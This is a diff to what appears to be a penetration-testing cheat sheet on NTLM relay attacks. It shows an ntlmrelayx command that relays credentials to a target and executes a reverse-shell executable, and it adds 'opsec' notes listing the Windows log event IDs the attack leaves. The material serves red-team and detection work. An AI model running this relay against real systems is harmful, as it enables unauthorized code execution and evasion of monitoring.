@@ -12,3 +12,12 @@ python ntlmrelayx.py -t <rhost> -e <./reverse.exe>
 
 # if client throws smb version-error use: -smb2support 
 
+# opsec considerations
+# Windows Security Log Event IDs
+-Logon (4624) -> multiple
+-Logoff (4634) -> multiple
+-Special Logon (4672) -> multiple
+
+# Windows System Logs
+Service Control Manager (7040) -> multiple
+
